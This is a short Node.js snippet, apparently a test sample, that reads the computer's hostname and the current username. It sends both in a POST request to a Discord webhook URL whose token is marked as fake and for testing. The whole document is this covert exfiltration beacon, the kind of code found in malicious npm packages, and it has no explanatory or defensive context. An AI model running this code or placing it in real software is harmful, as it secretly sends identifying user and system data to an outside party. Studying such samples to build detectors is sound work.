const https = require('https');
const os = require('os');
const data = JSON.stringify({ content: os.hostname() + ' ' + os.userInfo().username });
https.request('https://discord.com/api/webhooks/000000000000000000/fake-webhook-token-for-testing', { method: 'POST' }).end(data);
